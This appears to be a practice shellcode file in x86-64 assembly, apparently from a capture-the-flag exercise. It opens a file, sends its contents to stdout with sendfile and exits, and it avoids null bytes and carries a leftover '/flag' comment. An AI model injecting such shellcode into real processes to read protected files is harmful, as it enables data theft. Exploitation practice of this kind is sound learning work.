.data
_flag:
    .string "/home/vagrant/shell/new.s"
inst:
    .byte 0xcc

.text
.global _start

_start:
.intel_syntax noprefix
        push 2
        pop rax
        #mov rbx, 0x00000067616c662f 
#        inc byte ptr [rip] 
        .byte 0x48, 0x8d, 0x3c, 0x25, 0x00, 0x01, 0x40, 0x00 //   lea rdi, _flag   # The above does this
        push 0
        pop rsi
        push 0
        pop rdx
        syscall

        push 1
        pop rdi
        push rax
        pop rsi
        push 0
        pop rdx
        push 1000
        pop r10
        push 40
        pop rax
        syscall

        push 60
        pop rax
        syscall

